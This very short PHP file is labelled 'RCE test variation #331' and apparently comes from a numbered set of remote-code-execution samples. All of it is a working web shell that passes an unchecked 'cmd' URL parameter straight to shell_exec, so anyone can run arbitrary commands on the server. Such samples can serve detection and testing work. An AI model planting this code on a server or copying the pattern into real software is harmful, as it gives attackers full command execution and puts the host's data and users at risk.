<?php
// RCE test variation #331
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>